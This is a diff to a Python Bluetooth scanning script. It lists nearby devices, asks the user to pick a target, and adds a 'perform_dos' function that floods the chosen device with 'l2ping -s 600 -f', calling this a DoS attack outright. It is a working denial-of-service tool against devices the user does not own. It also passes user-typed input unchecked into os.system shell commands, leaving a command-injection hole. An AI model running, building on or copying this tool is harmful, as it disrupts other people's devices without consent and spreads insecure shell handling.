@@ -7,10 +7,10 @@ def scan_devices():
         output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
         lines = output.splitlines()
         devices = {}
-        for line in lines[1:]: 
+        for line in lines[1:]:
             info = line.split()
             mac = info[0]
-            device_name = ' '.join(info[2:])  
+            device_name = ' '.join(info[2:])
             devices[mac] = device_name
         return devices
     except subprocess.CalledProcessError as e:
@@ -26,6 +26,10 @@ def print_device_info(devices):
         print("---------------------------------------")
     else:
         print("No devices found idk maybe try again.")
+
+def perform_dos(target_mac):
+    print(f"Performing DoS attack on device with MAC address: {target_mac}")
+    os.system(f"l2ping -s 600 -f {target_mac}")
 
 def main():
     print("""    _   _  _ _____ ___   __  __   _   _  _ ___ _    ___ 
@@ -48,11 +52,9 @@ def main():
         target = input("Enter the ID or MAC address of the target device: ")
         if target.isdigit() and int(target) < len(devices):
             target_mac = list(devices.keys())[int(target)]
-            print(f"Pinging device with MAC address: {target_mac}")
-            os.system(f"l2ping -s 600 -f {target_mac}")
+            perform_dos(target_mac)
         elif target in devices:
-            print(f"Pinging device with MAC address: {target}")
-            os.system(f"l2ping -s 600 -f {target}")
+            perform_dos(target)
         else:
             print("Invalid ID or MAC address.")
     else:
